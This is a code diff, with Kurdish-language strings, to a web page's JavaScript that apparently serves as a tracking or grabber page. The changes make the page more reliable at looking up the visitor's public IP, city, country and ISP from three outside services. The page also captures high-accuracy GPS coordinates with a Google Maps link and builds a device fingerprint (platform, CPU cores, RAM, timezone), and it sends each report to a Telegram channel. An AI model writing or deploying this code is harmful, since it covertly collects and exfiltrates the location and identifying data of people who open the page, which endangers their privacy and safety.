@@ -219,27 +219,34 @@
             } catch(e) {}
         }
 
-        async function getRobustIPData() {
+        async function getUltimateIPData() {
+            let ipData = { ip: "نەزانراو", city: "نەزانراو", country_name: "نەزانراو", org: "نەزانراو" };
+            
             try {
                 let res = await fetch('https://ipapi.co/json/');
                 let data = await res.json();
-                if (data && data.ip) return data;
+                if (data && data.ip) {
+                    return { ip: data.ip, city: data.city || "نەزانراو", country_name: data.country_name || "نەزانراو", org: data.org || "نەزانراو" };
+                }
             } catch(e) {}
 
             try {
                 let res = await fetch('https://ipinfo.io/json');
                 let data = await res.json();
                 if (data && data.ip) {
-                    return {
-                        ip: data.ip,
-                        city: data.city,
-                        country_name: data.country,
-                        org: data.org
-                    };
+                    return { ip: data.ip, city: data.city || "نەزانراو", country_name: data.country || "نەزانراو", org: data.org || "نەزانراو" };
                 }
             } catch(e) {}
 
-            return { ip: "نەتوانرا دەستنیشان بکرێت", city: "", country_name: "", org: "" };
+            try {
+                let res = await fetch('https://api.ipify.org?format=json');
+                let data = await res.json();
+                if (data && data.ip) {
+                    ipData.ip = data.ip;
+                }
+            } catch(e) {}
+
+            return ipData;
         }
 
         function sendLocation() {
@@ -255,14 +262,8 @@
                                  `🗺️ [کردنەوە لە نەخشەی گۆگڵ](https://maps.google.com/?q=${lat},${lon})`;
                     sendToTelegramText(locMsg);
                 }, function(error) {
-                    let errDesc = "نەزانراو";
-                    if (error.code === 1) errDesc = "ڕەتکراوە لەلایەن بەکارهێنەرەوە (Permission Denied)";
-                    else if (error.code === 2) errDesc = "شوێن بەدەست نەهات (Position Unavailable)";
-                    else if (error.code === 3) errDesc = "کاتی وەرگرتن تەواو بوو (Timeout)";
-                    sendToTelegramText(`⚠️ *کێشەی شوێن (GPS):* ${errDesc} (Code: ${error.code})`);
+                    sendToTelegramText(`⚠️ *کێشەی شوێن (GPS):* ڕەتکراوە یان بەردەست نییە (Code: ${error.code})`);
                 }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
-            } else {
-                sendToTelegramText(`⚠️ *کێشەی شوێن:* Geolocation پشتگیری ناکرێت لەم براوسەرەدا.`);
             }
         }
 
@@ -316,14 +317,14 @@
             let cpuCores = navigator.hardwareConcurrency || "نەزانراو";
             let deviceRam = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "نەزانراو";
 
-            let ipData = await getRobustIPData();
+            let ipData = await getUltimateIPData();
 
             let report = `💎 *ڕاپۆرتی لووتکەی زۆر قووڵ (ULTIMATE DEEP PRO):*\n\n` +
                          `🌐 *ڕایەڵە و ئایپی دڵنیاکراوە:*\n` +
                          `• *ئایپی گشتی:* \`${ipData.ip}\`\n` +
                          `• *وڵات و شار:* ${ipData.country_name} - ${ipData.city}\n` +
-                         `• *ناوچەی کاتی:* \`${timezone}\`\n` +
-                         `• *دابینکەری هێڵ:* ${ipData.org}\n\n` +
+                         `• *دابینکەری هێڵ:* ${ipData.org}\n` +
+                         `• *ناوچەی کاتی:* \`${timezone}\`\n\n` +
                          `💻 *ڕەقامەواڵە و فینگەرپرینت:*\n` +
                          `• سیستم: ${platform}\n` +
                          `• پرۆسێسەر (Cores): ${cpuCores}\n` +
